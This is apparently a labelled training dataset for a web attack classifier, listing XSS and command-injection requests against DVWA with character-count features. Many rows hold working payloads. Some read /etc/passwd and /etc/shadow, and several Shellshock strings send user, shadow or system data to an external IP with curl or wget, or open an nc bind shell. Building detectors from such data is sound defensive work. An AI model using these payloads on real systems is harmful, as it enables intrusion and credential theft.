Method,Path,Body,Single Quotes,Double Quotes,Dashes,Braces,Spaces,Tags,Colons,Backtick,Bad Words,XSS Check,XSS Word,Cmdi Word,Cmdi Check,Class
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbase%20id%3dx%20tabindex%3d1%20onfocus%3dalert(1)%3e%3c%2fbase%3e,,0,0,0,1,3,4,0,0,1,0,0,1,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbase%20id%3dx%20tabindex%3d1%20onfocusin%3dalert(1)%3e%3c%2fbase%3e,,0,0,0,1,3,4,0,0,1,0,0,1,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbase%20onbeforecopy%3d%22alert(1)%22%20contenteditable%3etest%3c%2fbase%3e,,0,2,0,1,2,4,0,0,0,1,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbase%20onbeforecut%3d%22alert(1)%22%20contenteditable%3etest%3c%2fbase%3e,,0,2,0,1,2,4,0,0,0,1,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbase%20onbeforepaste%3d%22alert(1)%22%20contenteditable%3etest%3c%2fbase%3e,,0,2,0,1,2,4,0,0,0,1,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbase%20onblur%3dalert(1)%20tabindex%3d1%20id%3dx%3e%3c%2fbase%3e%3cinput%20autofocus%3e,,0,0,0,1,4,6,0,0,1,0,0,1,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbase%20onclick%3d%22alert(1)%22%3etest%3c%2fbase%3e,,0,2,0,1,1,4,0,0,0,1,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbase%20oncontextmenu%3d%22alert(1)%22%3etest%3c%2fbase%3e,,0,2,0,1,1,4,0,0,0,1,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbase%20oncopy%3d%22alert(1)%22%20contenteditable%3etest%3c%2fbase%3e,,0,2,0,1,2,4,0,0,0,1,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbase%20oncut%3d%22alert(1)%22%20contenteditable%3etest%3c%2fbase%3e,,0,2,0,1,2,4,0,0,0,1,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbase%20ondblclick%3d%22alert(1)%22%3etest%3c%2fbase%3e,,0,2,0,1,1,4,0,0,0,1,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbase%20onfocusout%3dalert(1)%20tabindex%3d1%20id%3dx%3e%3c%2fbase%3e%3cinput%20autofocus%3e,,0,0,0,1,4,6,0,0,1,0,0,1,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbase%20onkeydown%3d%22alert(1)%22%20contenteditable%3etest%3c%2fbase%3e,,0,2,0,1,2,4,0,0,0,1,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbase%20onkeypress%3d%22alert(1)%22%20contenteditable%3etest%3c%2fbase%3e,,0,2,0,1,2,4,0,0,0,1,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbase%20onkeyup%3d%22alert(1)%22%20contenteditable%3etest%3c%2fbase%3e,,0,2,0,1,2,4,0,0,0,1,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbase%20onmousedown%3d%22alert(1)%22%3etest%3c%2fbase%3e,,0,2,0,1,1,4,0,0,0,1,0,0,0,XSS
POST,/DVWA/vulnerabilities/exec/,ip=%7C%7C+dir&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;&Submit=Submit,0,0,2,0,0,0,4,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;&Submit=Submit,0,0,2,0,0,0,4,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;&Submit=Submit,0,0,2,0,0,0,4,0,1,0,0,3,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;&Submit=Submit,0,0,2,0,0,0,4,0,1,0,0,3,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=/index.html|id|&Submit=Submit,0,0,0,0,0,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;id;&Submit=Submit,0,0,0,0,0,0,2,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;id&Submit=Submit,0,0,0,0,0,0,1,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;netstat -a;&Submit=Submit,0,0,0,0,1,0,2,0,0,0,1,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;system('cat%20/etc/passwd')&Submit=Submit,2,0,0,1,0,0,1,0,1,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;id;&Submit=Submit,0,0,0,0,0,0,2,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=|id&Submit=Submit,0,0,0,0,0,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=|/usr/bin/id&Submit=Submit,0,0,0,0,0,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=|id|&Submit=Submit,0,0,0,0,0,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=|/usr/bin/id|&Submit=Submit,0,0,0,0,0,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=||/usr/bin/id|&Submit=Submit,0,0,0,0,0,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=|id;&Submit=Submit,0,0,0,0,0,0,1,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=||/usr/bin/id;&Submit=Submit,0,0,0,0,0,0,1,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;id|&Submit=Submit,0,0,0,0,0,0,1,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;|/usr/bin/id|&Submit=Submit,0,0,0,0,0,0,1,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=\n/bin/ls -al\n&Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=\n/usr/bin/id\n&Submit=Submit,0,0,0,0,0,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=\nid\n&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=\n/usr/bin/id;&Submit=Submit,0,0,0,0,0,0,1,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=\nid;&Submit=Submit,0,0,0,0,0,0,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=\n/usr/bin/id|&Submit=Submit,0,0,0,0,0,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=\nid|&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;/usr/bin/id\n&Submit=Submit,0,0,0,0,0,0,1,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;id\n&Submit=Submit,0,0,0,0,0,0,1,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=|usr/bin/id\n&Submit=Submit,0,0,0,0,0,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=|nid\n&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=`id`&Submit=Submit,0,0,0,0,0,0,0,2,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=`/usr/bin/id`&Submit=Submit,0,0,0,0,0,0,0,2,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a);id&Submit=Submit,0,0,0,0,0,0,1,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a;id&Submit=Submit,0,0,0,0,0,0,1,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a);id;&Submit=Submit,0,0,0,0,0,0,2,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a;id;&Submit=Submit,0,0,0,0,0,0,2,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a);id|&Submit=Submit,0,0,0,0,0,0,1,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a;id|&Submit=Submit,0,0,0,0,0,0,1,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a)|id&Submit=Submit,0,0,0,0,0,0,0,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a|id&Submit=Submit,0,0,0,0,0,0,0,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a)|id;&Submit=Submit,0,0,0,0,0,0,1,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a|id&Submit=Submit,0,0,0,0,0,0,0,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=|/bin/ls -al&Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a);/usr/bin/id&Submit=Submit,0,0,0,0,0,0,1,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a;/usr/bin/id&Submit=Submit,0,0,0,0,0,0,1,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a);/usr/bin/id;&Submit=Submit,0,0,0,0,0,0,2,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a;/usr/bin/id;&Submit=Submit,0,0,0,0,0,0,2,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a);/usr/bin/id|&Submit=Submit,0,0,0,0,0,0,1,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a;/usr/bin/id|&Submit=Submit,0,0,0,0,0,0,1,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a)|/usr/bin/id&Submit=Submit,0,0,0,0,0,0,0,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a|/usr/bin/id&Submit=Submit,0,0,0,0,0,0,0,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a)|/usr/bin/id;&Submit=Submit,0,0,0,0,0,0,1,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a|/usr/bin/id&Submit=Submit,0,0,0,0,0,0,0,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;system('cat%20/etc/passwd')&Submit=Submit,2,0,0,1,0,0,1,0,1,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;system('id')&Submit=Submit,2,0,0,1,0,0,1,0,2,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;system('/usr/bin/id')&Submit=Submit,2,0,0,1,0,0,1,0,2,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%0Acat%20/etc/passwd&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%0A/usr/bin/id&Submit=Submit,0,0,0,0,0,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%0Aid&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%0A/usr/bin/id%0A&Submit=Submit,0,0,0,0,0,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%0Aid%0A&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& ping -i 30 127.0.0.1 &&Submit=Submit,0,0,0,0,5,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& ping -n 30 127.0.0.1 &&Submit=Submit,0,0,0,0,5,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%0a ping -i 30 127.0.0.1 %0a&Submit=Submit,0,0,0,0,5,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=`ping 127.0.0.1`&Submit=Submit,0,0,0,0,1,0,0,2,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| id&Submit=Submit,0,0,0,0,1,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& id&Submit=Submit,0,0,0,0,1,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; id&Submit=Submit,0,0,0,0,1,0,1,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%0a id %0a&Submit=Submit,0,0,0,0,2,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=`id`&Submit=Submit,0,0,0,0,0,0,0,2,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=$;/usr/bin/id&Submit=Submit,0,0,0,0,0,0,1,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""&Submit=Submit",0,2,0,3,6,0,2,2,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""&Submit=Submit",0,2,0,3,6,0,2,2,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""&Submit=Submit",0,2,0,3,8,0,2,2,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""&Submit=Submit",0,2,0,3,7,0,2,2,0,0,1,3,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""&Submit=Submit",0,2,0,3,10,0,2,2,0,0,0,3,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""&Submit=Submit",0,2,0,3,11,0,2,2,0,0,0,3,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""&Submit=Submit",0,2,0,3,6,0,2,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""&Submit=Submit",0,2,0,3,9,0,2,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""&Submit=Submit",0,2,0,3,10,0,2,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""&Submit=Submit",0,2,0,3,9,0,2,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""&Submit=Submit",0,2,0,3,10,0,2,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""&Submit=Submit",0,2,0,3,9,0,2,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""&Submit=Submit",0,2,0,3,9,0,2,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""&Submit=Submit",0,2,0,3,10,0,2,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""&Submit=Submit",0,2,0,3,6,0,2,2,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""&Submit=Submit",0,2,0,3,6,0,2,2,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""&Submit=Submit",0,2,0,3,8,0,2,2,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""&Submit=Submit",0,2,0,3,7,0,2,2,0,0,1,3,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""&Submit=Submit",0,2,0,3,10,0,2,2,0,0,0,3,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""&Submit=Submit",0,2,0,3,11,0,2,2,0,0,0,3,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""&Submit=Submit",0,2,0,3,6,0,2,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=cat /etc/hosts&Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=$(`cat /etc/passwd`)&Submit=Submit,0,0,0,1,1,0,0,2,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=cat /etc/passwd&Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%0Acat%20/etc/passwd&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip={{ get_user_file(""/etc/passwd"") }}&Submit=Submit",0,2,0,5,2,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=<!--#exec cmd=""/bin/cat /etc/passwd""-->&Submit=Submit",0,2,2,0,2,2,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=<!--#exec cmd=""/bin/cat /etc/shadow""-->&Submit=Submit",0,2,2,0,2,2,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=<!--#exec cmd=""/usr/bin/id;-->&Submit=Submit",0,1,2,0,1,2,1,0,1,0,0,3,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=system('cat /etc/passwd');&Submit=Submit,2,0,0,1,1,0,1,0,1,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=<?php system(""cat /etc/passwd"");?>&Submit=Submit",0,2,0,1,2,2,1,0,1,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=`&Submit=Submit,0,0,0,0,0,0,0,1,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=|| &Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| &Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; &Submit=Submit,0,0,0,0,1,0,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip='&Submit=Submit,1,0,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip='""&Submit=Submit",1,1,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=""&Submit=Submit",0,1,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=""'&Submit=Submit",1,1,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& &Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& &Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%0a&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%0a%0d&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%0Aid&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%0a id %0a&Submit=Submit,0,0,0,0,2,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%0Aid%0A&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%0a ping -i 30 127.0.0.1 %0a&Submit=Submit,0,0,0,0,5,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%0A/usr/bin/id&Submit=Submit,0,0,0,0,0,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%0A/usr/bin/id%0A&Submit=Submit,0,0,0,0,0,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 &Submit=Submit",1,1,0,0,19,0,0,4,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%20{${phpinfo()}}&Submit=Submit,0,0,0,5,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%20{${sleep(20)}}&Submit=Submit,0,0,0,5,0,0,0,0,1,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=%20{${sleep(3)}}&Submit=Submit,0,0,0,5,0,0,0,0,1,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a|id|&Submit=Submit,0,0,0,0,0,0,0,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a;id|&Submit=Submit,0,0,0,0,0,0,1,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a;id;&Submit=Submit,0,0,0,0,0,0,2,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=a;id\n&Submit=Submit,0,0,0,0,0,0,1,0,1,0,1,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12&Submit=Submit,0,0,0,3,4,0,2,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| curl http://crowdshield.com/.testing/rce.txt&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& curl http://crowdshield.com/.testing/rce.txt&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; curl https://crowdshield.com/.testing/rce_vuln.txt&Submit=Submit,0,0,0,0,2,0,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& curl https://crowdshield.com/.testing/rce_vuln.txt&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=curl https://crowdshield.com/.testing/rce_vuln.txt&Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt&Submit=Submit",1,1,0,0,10,0,0,4,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt&Submit=Submit",1,1,0,0,10,0,0,4,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)&Submit=Submit,0,0,0,1,1,0,0,2,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=dir&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| dir&Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; dir&Submit=Submit,0,0,0,0,1,0,1,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=$(`dir`)&Submit=Submit,0,0,0,1,0,0,0,2,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& dir&Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&&dir&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& dir&Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| dir C:\&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; dir C:\&Submit=Submit,0,0,0,0,2,0,1,0,0,0,0,2,6,cmdi
